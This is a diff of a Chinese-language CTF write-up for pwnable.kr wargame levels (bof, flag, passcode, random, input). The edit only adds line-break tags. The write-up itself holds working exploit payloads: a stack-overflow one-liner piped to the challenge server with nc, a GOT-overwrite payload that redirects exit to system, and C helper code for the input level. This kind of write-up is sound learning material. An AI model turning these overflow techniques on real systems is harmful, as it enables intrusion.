@@ -5,24 +5,24 @@ padding = 'A'*52 #这里不是算的
 key_addr = struct.pack("I", 0xcafebabe)
 print padding + key_addr
 ```
-重点是确定填充的字节，由func中
-0x56555649 <+29>:   lea    eax,[ebp-0x2c]
-2C 是 44 填充44个A 再加上addr正好覆盖ebp这个地址，而
-0x56555654 <+40>:  cmp    DWORD PTR [ebp+0x8],0xcafebabe
-所以只有再加8就正好覆盖了比较的地址，即key的位置。
-知道这个之后就可以利用python加管道进行pwn
-(python -c 'print "A"*52+"\xbe\xba\xfe\xca"';cat) | nc pwnable.kr 9000
+重点是确定填充的字节，由func中<br>
+0x56555649 <+29>:   lea    eax,[ebp-0x2c]<br>
+2C 是 44 填充44个A 再加上addr正好覆盖ebp这个地址，而<br>
+0x56555654 <+40>:  cmp    DWORD PTR [ebp+0x8],0xcafebabe<br>
+所以只有再加8就正好覆盖了比较的地址，即key的位置。<br>
+知道这个之后就可以利用python加管道进行pwn<br>
+(python -c 'print "A"*52+"\xbe\xba\xfe\xca"';cat) | nc pwnable.kr 9000<br>
 
 #flag
-IDA打开之后就看到upx的字符，猜测是upx壳，linux下看了一下，apt安装下upx然后就可以解壳了
+IDA打开之后就看到upx的字符，猜测是upx壳，linux下看了一下，apt安装下upx然后就可以解壳了<br>
 
 #passcode
-这题完全不知道怎么做，然后看国外大牛的wp。理解了半天，没懂。
-然后自己gdb调试，，忽然想起来，在调用welcome之后和调用login之后，
-esp的地址一样，这样因为函数开始的时候都有mov    ebp,esp。
-所以ebp(ebp在整个函数初始化指针之后是不会再改变的)就是可以认为是一样的，然后welcome调用结束后的数据并没有清楚，而是留在栈上，栈调用welcome结束后仅仅是把指针调整了，并没有清除数据，所以这里就是可以利用的地方。
-然后这个还有个条件，就是scanf("%d", passcode1);IDA逆向出来是__isoc99_scanf("%d");这样程序就会直接读取对应栈上的值
-0x70-0x10 = 0x60 = 96。只要有96个就能覆盖passcode1的值
+这题完全不知道怎么做，然后看国外大牛的wp。理解了半天，没懂。<br>
+然后自己gdb调试，，忽然想起来，在调用welcome之后和调用login之后，<br>
+esp的地址一样，这样因为函数开始的时候都有mov    ebp,esp。<br>
+所以ebp(ebp在整个函数初始化指针之后是不会再改变的)就是可以认为是一样的，然后welcome调用结束后的数据并没有清楚，而是留在栈上，栈调用welcome结束后仅仅是把指针调整了，并没有清除数据，所以这里就是可以利用的地方。<br>
+然后这个还有个条件，就是scanf("%d", passcode1);IDA逆向出来是__isoc99_scanf("%d");这样程序就会直接读取对应栈上的值<br>
+0x70-0x10 = 0x60 = 96。只要有96个就能覆盖passcode1的值<br>
 ```
 welcome:
 0x0804862f <+38>:   lea    edx,[ebp-0x70]
@@ -39,21 +39,21 @@ login:
 0x080485e3 <+127>:   mov    DW0ORD PTR [esp],0x80487af
 0x080485ea <+134>:   call   0x8048460 <system@plt>
 ```
-system("")对应的地址：0x080485d7 = 134514135
-0x080485e3
-偏移表中exit对应的地址804a018
-于是就可以'A'*96 + '\x18\xa0\x04\x08' + '134514135\n'
+system("")对应的地址：0x080485d7 = 134514135<br>
+0x080485e3<br>
+偏移表中exit对应的地址804a018<br>
+于是就可以'A'*96 + '\x18\xa0\x04\x08' + '134514135\n'<br>
 
 #random
-开始看的rand没有思路，然而，，，如此简单。
-rand需要先srand初始化化下时间种子，否则rand的返回值一直固定。然后利用异或的性质，ok
+开始看的rand没有思路，然而，，，如此简单。<br>
+rand需要先srand初始化化下时间种子，否则rand的返回值一直固定。然后利用异或的性质，ok<br>
 
 #input
 ```
 ./input `python -c "print 'A '*47 + '\x00' + '\x20\x0a\x0d'"`
 ```
-发现不行，截取字符串的时候没有把\x00当成一个整体。
-然后只能又是找wp，发现都是用c来写的，定义个数组orz
+发现不行，截取字符串的时候没有把\x00当成一个整体。<br>
+然后只能又是找wp，发现都是用c来写的，定义个数组orz<br>
 ```
 #include <stdio.h>
 #include <stdlib.h>
@@ -70,12 +70,12 @@ int main()
     return 0;
 }
 ```
-第一个直接通过传参数就能通过。
-第二个就有点头疼了，查了一下fd句柄的说明
-0:stdin标准输入
-1:stdout
-2:stderr
-orz。然后又看wp，有一种是利用dup2来改变fd句柄，通过管道进行赋值
+第一个直接通过传参数就能通过。<br>
+第二个就有点头疼了，查了一下fd句柄的说明<br>
+0:stdin标准输入<br>
+1:stdout<br>
+2:stderr<br>
+orz。然后又看wp，有一种是利用dup2来改变fd句柄，通过管道进行赋值<br>
 ```
     if(fork() == 0)
     {
@@ -93,9 +93,9 @@ orz。然后又看wp，有一种是利用dup2来改变fd句柄，通过管道进
         write(pipe2[1], "\x00\x0a\x02\xff", 4);
     }
 ```
-这样前三个就over了
-然后第四个是文件读写，这个还是很简单的，查一下fopen和fwrite就好了
-最后一个是socket，之前搞arm的时候看了一点然而。。。
+这样前三个就over了<br>
+然后第四个是文件读写，这个还是很简单的，查一下fopen和fwrite就好了<br>
+最后一个是socket，之前搞arm的时候看了一点然而。。。<br>
 ```
 	int sd, cd;
 	struct sockaddr_in saddr, caddr;
@@ -125,11 +125,11 @@ orz。然后又看wp，有一种是利用dup2来改变fd句柄，通过管道进
 	if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
 	printf("Stage 5 clear!\n");
 ```
-然后方法其实不是在c里面写个socket通信，直接python
-python -c "print '\xde\xad\xbe\xef'“ | nc 127.0.0.1 9000
-Tips: 本地ip地址是127.0.0.1
-9000好像不行，换一个。88888..试了好久，网络各种卡。。
-算了，还是写个socket吧。。
+然后方法其实不是在c里面写个socket通信，直接python<br>
+python -c "print '\xde\xad\xbe\xef'“ | nc 127.0.0.1 9000<br>
+Tips: 本地ip地址是127.0.0.1<br>
+9000好像不行，换一个。88888..试了好久，网络各种卡。。<br>
+算了，还是写个socket吧。。<br>
 ```
 int sd,cd;
 struct sockaddr_in saddr, caddr;
@@ -148,4 +148,6 @@ connect(sd, (struct sockaddr *)&saddr, sizeof(saddr));
 send(sd, "\xde\xad\xbe\xef", 4, 0);
 close(sd);
 ```
-通过~
+通过~<br>
+
+to be continued
